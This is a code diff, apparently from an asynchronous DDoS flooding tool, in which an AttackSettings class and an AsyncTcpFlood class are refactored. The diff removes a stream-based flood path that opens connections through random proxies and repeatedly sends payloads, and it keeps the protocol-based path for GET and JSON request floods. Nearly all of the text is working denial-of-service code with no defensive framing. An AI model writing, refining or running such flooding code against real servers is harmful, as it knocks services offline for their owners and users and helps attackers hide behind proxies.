@@ -618,9 +618,6 @@ def request_info_size(request: aiohttp.RequestInfo) -> int:
 
 
 class AttackSettings:
-    TRANSPORT_STREAM = "stream"
-    TRANSPORT_SOCK = "sock"
-    TRANSPORT_PROTO = "proto"
 
     connect_timeout_seconds: float
     dest_connect_timeout_seconds: float
@@ -634,10 +631,9 @@ class AttackSettings:
     def __init__(
         self,
         *,
-        transport: str = "stream",
         connect_timeout_seconds: float = SOCK_TIMEOUT,
         dest_connect_timeout_seconds: float = SOCK_TIMEOUT,
-        drain_timeout_seconds: float = 0.1,
+        drain_timeout_seconds: float = 5.0,
         close_timeout_seconds: float = 1.0,
         http_response_timeout_seconds: float = 15.0,
         tcp_read_timeout_seconds: float = 0.2,
@@ -645,7 +641,6 @@ class AttackSettings:
         high_watermark: int = 1024 << 5,
         reader_limit: int = 1024 << 6,
     ):
-        self.transport = transport
         self.connect_timeout_seconds = connect_timeout_seconds
         self.dest_connect_timeout_seconds = dest_connect_timeout_seconds
         self.drain_timeout_seconds = drain_timeout_seconds
@@ -683,102 +678,6 @@ class AsyncTcpFlood(HttpFlood):
                 return True
             else:
                 raise exc
-
-    # note that TCP_NODELAY is set by default since Python3.6+
-    async def open_connection(self) -> Tuple[asyncio.StreamReader, asyncio.StreamWriter]:
-        is_tls = self._target.scheme.lower() == "https" or self._target.port == 443
-        ssl_ctx = ctx if is_tls else None
-        # setting hostname to an empty string due to https://bugs.python.org/issue27391
-        server_hostname = "" if is_tls else None
-        proxy_url: str = self._proxies.pick_random()
-        if proxy_url:
-            conn = aiohttp_socks.open_connection(
-                proxy_url=proxy_url,
-                host=self._addr,
-                port=self._target.port,
-                ssl=ssl_ctx,
-                server_hostname=server_hostname,
-                limit=self._settings.reader_limit,
-            )
-        else:
-            conn = asyncio.open_connection(
-                host=self._addr,
-                port=self._target.port,
-                ssl=ssl_ctx,
-                server_hostname=server_hostname,
-                limit=self._settings.reader_limit
-            )
-        async with timeout(self._settings.connect_timeout_seconds):
-            reader, writer = await conn
-        self._stats.track_open_connection()
-        writer.transport.set_write_buffer_limits(high=self._settings.high_watermark)
-        return reader, writer
-
-    def _closed_connection(self, f: asyncio.Future) -> None:
-        # note that we don't shild wait_closed task, which means it might
-        # be canceled. overall, it's hard to make sure that each closed or
-        # non-closed connection would be tracked properly. which is fine,
-        # as we only use this information for display purpose
-        self._stats.track_close_connection()
-        try:
-            # we only need to read this result to avoid asyncio warning
-            # about non-consumed exceptions
-            f.result()
-        except:
-            # XXX: there should be an option to see error
-            #      e.g. TRACE level of logging or something
-            pass
-
-    async def _close_connection(self, writer: asyncio.StreamWriter) -> None:
-        if writer.can_write_eof():
-            writer.write_eof()
-        elif self._settings.transport == AttackSettings.TRANSPORT_SOCK:
-            writer.get_extra_info("socket")._sock.close()
-            self._stats.track_close_connection()
-        else:
-            writer.close()
-            close_task = asyncio.create_task(writer.wait_closed())
-            close_task.add_done_callback(self._closed_connection)
-            async with timeout(self._settings.close_timeout_seconds):
-                await close_task
-
-    async def _send_packet(self, writer: asyncio.StreamWriter, payload: bytes) -> None:
-        # this means that connection_lost was caused by peer
-        # won't work for transport that do not track the attribute, e.g. SSL
-        if getattr(writer.transport, "_conn_lost", 0):
-            raise RuntimeError("Connection lost unexpectedly (transport)")
-
-        if self._settings.transport == AttackSettings.TRANSPORT_SOCK:
-            sock = writer.get_extra_info("socket")._sock
-            async with timeout(self._settings.drain_timeout_seconds):
-                await self._loop.sock_sendall(sock, payload),
-        else:
-            writer.write(payload)
-            async with timeout(self._settings.drain_timeout_seconds):
-                await writer.drain()
-        self._stats.track(1, len(payload))
-
-    async def _generic_flood(self, payload, *, rpc: Optional[int] = None) -> bool:
-        if self._settings.transport == AttackSettings.TRANSPORT_PROTO:
-            return await self._generic_flood_proto(payload, rpc=rpc)
-        else:
-            return await self._generic_flood_stream(payload, rpc=rpc)
-
-    async def _generic_flood_stream(self, payload, *, rpc: Optional[int] = None) -> bool:
-        rpc = rpc or self._settings.requests_per_connection
-        if not isinstance(payload, bytes):
-            payload = payload()
-        packets_sent, packet_size = 0, len(payload)
-        reader, writer = await self.open_connection()
-        if hasattr(writer.transport, "pause_reading"):
-            writer.transport.pause_reading()
-        try:
-            for _ in range(rpc):
-                await self._send_packet(writer, payload)
-                packets_sent += 1
-        finally:
-            await self._close_connection(writer)
-        return packets_sent > 0
 
     # XXX: get rid of RPC param when OVH is gone
     async def _generic_flood_proto(
@@ -840,7 +739,6 @@ class AsyncTcpFlood(HttpFlood):
         else:
             return bool(await on_close)
 
-    # XXX: again, with functions it's just a partial
     async def GET(self, on_connect=None) -> bool:
         payload: bytes = self.generate_payload()
         return await self._generic_flood_proto(payload, on_connect=on_connect)
@@ -851,7 +749,6 @@ class AsyncTcpFlood(HttpFlood):
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/json\r\n\r\n"
              '{"data": %s}') % Tools.rand_str(32))[:-2]
-        return await self._generic_flood(payload)
         return await self._generic_flood_proto(payload, on_connect=on_connect)
 
     async def STRESS(self, on_connect=None) -> bool:
